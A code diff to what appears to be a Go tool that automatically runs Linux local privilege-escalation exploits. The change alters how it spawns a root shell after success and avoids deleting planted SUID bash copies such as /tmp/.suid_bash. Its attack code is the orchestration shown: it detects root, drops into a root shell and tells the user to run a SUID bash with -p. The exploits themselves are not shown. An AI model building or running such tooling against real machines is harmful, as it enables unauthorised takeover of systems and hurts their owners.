@@ -210,7 +210,7 @@ func runOne(s *systemInfo, e Exploit, stop *bool) {
 	}
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
-			rootspawn(&r)
+			shellSpawned = rootspawn(&r)
 		}
 		if !*flagNoStop {
 			*stop = true
@@ -294,7 +294,7 @@ func runAutorootPhases(s *systemInfo, stop *bool) {
 	}
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
-			rootspawn(&r)
+			shellSpawned = rootspawn(&r)
 		}
 		if !*flagNoStop {
 			*stop = true
@@ -322,30 +322,48 @@ func printChildOutput(r *runResult) {
 	}
 }
 
-// finalize prints the summary and, if root was gained and spawning is
-// allowed but hasn't happened yet, spawns the shell.
+// finalize prints the summary. If root was gained but the shell wasn't
+// spawned yet (e.g. -no-spawn or the exploit didn't drop a SUID bash),
+// it prints a hint. The actual cleanup of temp artifacts is done only if
+// we did NOT spawn a shell (so we don't wipe /tmp/.suid_bash before use).
 func finalize(s *systemInfo, stop *bool) {
 	fmt.Println()
 	if *stop || isRootNow() || isSUIDBash() {
-		okf("Root was achieved. Cleaning up temp artifacts.")
-		cleanupTemp()
-		if !*flagNoSpawn && (isSUIDBash() || isRootNow()) {
-			rootspawn(&runResult{name: "finalize"})
-		} else {
-			okf("Shell spawn skipped (-no-spawn or already returned).")
+		okf("Root was achieved.")
+		if !*flagNoSpawn {
+			// Try to spawn the shell one more time in case the earlier
+			// attempt returned without spawning (no SUID bash at the time).
+			if !shellSpawned && (isSUIDBash() || isRootNow()) {
+				shellSpawned = rootspawn(&runResult{name: "finalize"})
+			}
+		}
+		if !shellSpawned {
 			if isSUIDBash() {
 				path := "/bin/bash"
-				if isSUIDFile("/tmp/.sb") {
+				if isSUIDFile("/tmp/.suid_bash") {
+					path = "/tmp/.suid_bash"
+				} else if isSUIDFile("/tmp/.sb") {
 					path = "/tmp/.sb"
 				}
 				okf("Run this to get a root shell: %s -p", path)
+			} else {
+				okf("Shell spawn skipped (-no-spawn).")
 			}
+		}
+		// Only clean up if we never spawned (so we don't wipe the SUID
+		// shell binary the user is now sitting in).
+		if !shellSpawned {
+			cleanupTemp()
 		}
 		return
 	}
 	badf("No exploit succeeded.")
 	warnf("Try: -kernel-filter=false  to brute-force all entries, or  -only NAME")
 }
+
+// shellSpawned is set once rootspawn actually drops into a shell, so
+// finalize() doesn't try to spawn twice or clean up a live SUID binary.
+var shellSpawned bool
 
 // cleanupTemp removes runner-generated temp files.
 func cleanupTemp() {
